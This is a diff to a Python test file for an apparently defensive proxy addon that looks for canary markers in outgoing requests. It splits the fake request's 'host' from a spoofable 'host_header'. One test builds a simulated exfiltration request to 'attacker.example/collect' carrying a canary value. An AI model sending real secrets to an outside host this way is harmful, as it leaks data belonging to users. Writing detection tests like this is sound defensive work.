@@ -34,13 +34,22 @@ _TS = "2026-08-06T00:00:00+00:00"
 
 @dataclass
 class _FakeRequest:
+    """See ``tests/test_proxy_addon._FakeRequest``: ``host`` is where the connection goes,
+    ``host_header`` what the client asserted, and they are separate because a spoof is exactly
+    the two disagreeing."""
+
     method: str = "POST"
     scheme: str = "https"
-    pretty_host: str = "api.anthropic.com"
+    host: str = "api.anthropic.com"
+    host_header: str | None = None
     port: int = 443
     path: str = "/v1/messages"
     headers: dict[str, str] = field(default_factory=dict)
     content: bytes | None = b""
+
+    def __post_init__(self) -> None:
+        if self.host_header is None:
+            self.host_header = self.host
 
 
 @dataclass
@@ -158,7 +167,7 @@ def test_build_addon_scans_a_body_for_the_configs_canaries() -> None:
     addon = build_addon(config, _HOST_ENVIRON, clock=lambda: _TS)
     addon.on_request(
         _FakeRequest(
-            pretty_host="attacker.example",
+            host="attacker.example",
             path="/collect",
             content=f"exfil={canaries[0].marker}".encode(),
         )
